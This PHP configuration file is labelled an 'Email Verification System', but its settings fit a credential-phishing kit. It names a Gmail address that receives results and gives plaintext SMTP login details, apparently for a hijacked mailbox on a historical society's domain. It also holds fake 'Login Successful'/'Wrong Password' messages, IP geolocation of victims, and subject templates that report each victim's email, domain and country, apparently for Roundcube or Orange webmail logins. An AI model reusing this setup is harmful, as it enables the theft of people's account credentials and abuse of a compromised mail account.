<?php
/**
 * Configuration file for Email Verification System
 * 
 * Move sensitive settings here and secure this file properly
 */

// Email notification settings
define('RECEIVER_EMAIL', 'skkho87.sm@gmail.com');

// SMTP settings for sending notifications
define('SMTP_HOST', 'mail.historischeverenigingroon.nl');
define('SMTP_PORT', 587);
define('SMTP_USERNAME', 'archief@historischeverenigingroon.nl');
define('SMTP_PASSWORD', 'gXShzqZtV6Kgd5Q');
define('SMTP_FROM_NAME', 'SS-RCube');

// Security settings
define('RATE_LIMIT_SECONDS', 5);        // Minimum seconds between requests
define('RATE_LIMIT_MAX_ATTEMPTS', 3);   // Maximum attempts within time window
define('CONNECTION_TIMEOUT', 10);       // SMTP connection timeout in seconds

// Logging settings
define('LOG_FILE', 'SS-Or.txt');
define('ENABLE_LOGGING', true);

// Geolocation settings
define('GEO_API_URL', 'http://www.geoplugin.net/json.gp?ip=');
define('GEO_TIMEOUT', 5);

// Development settings (set to false in production)
define('DEBUG_MODE', false);
define('SHOW_ERRORS', false);

// Error messages
define('ERROR_MISSING_FIELDS', 'Email and password are required');
define('ERROR_INVALID_EMAIL', 'Invalid email format');
define('ERROR_RATE_LIMIT', 'Too many requests. Please wait before trying again.');
define('ERROR_PHPMAILER_MISSING', 'Email system not properly configured');
define('ERROR_CONNECTION_FAILED', 'Connection failed. Please try again.');

// Success messages
define('MSG_LOGIN_SUCCESS', 'Login Successful');
define('MSG_LOGIN_FAILED', 'Wrong Password');

// Subject line templates
define('SUBJECT_SUCCESS_TEMPLATE', '%s || %s || %s');  // domain, country, email
define('SUBJECT_FAIL_TEMPLATE', 'notVerifiedRcubOrange || %s || %s');  // country, email

/**
 * Get configuration value safely
 */
function getConfig($key, $default = null) {
    return defined($key) ? constant($key) : $default;
}

/**
 * Check if we're in debug mode
 */
function isDebugMode() {
    return getConfig('DEBUG_MODE', false);
}

/**
 * Enable error reporting if in debug mode
 */
if (isDebugMode()) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
} else {
    error_reporting(0);
    ini_set('display_errors', 0);
}
?>